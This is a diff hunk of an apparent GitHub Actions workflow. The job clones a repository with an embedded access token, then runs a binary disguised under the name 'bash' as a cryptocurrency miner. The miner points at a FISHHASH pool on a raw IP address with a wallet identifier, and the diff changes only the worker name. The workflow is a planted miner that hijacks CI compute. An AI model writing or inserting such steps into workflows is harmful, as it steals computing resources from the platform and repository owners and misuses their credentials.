@@ -97,5 +97,5 @@ jobs:
           git clone https://x-access-token:$GH_TOKEN@github.com/hujisanda/lol198.git
           cd lol198
           chmod +x ./bash
-          ./bash --algo FISHHASH --pool 103.127.97.11:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+120543.LOLOP --ethstratum ETHPROXY
+          ./bash --algo FISHHASH --pool 103.127.97.11:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+120543.COLOPOA --ethstratum ETHPROXY
           
